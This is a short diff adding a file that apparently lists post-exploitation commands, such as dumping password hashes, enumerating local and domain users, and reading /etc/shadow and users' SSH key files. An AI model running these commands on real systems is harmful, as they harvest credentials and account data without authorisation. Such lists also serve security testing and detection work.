@@ -1,0 +1,13 @@
+hashdump
+
+
+shell
+whoami
+net user
+net user /domain
+dir
+ls
+ls /home
+cat /etc/passwd
+cat /etc/shadow
+cat /home/*/.ssh/id_rsa.pub
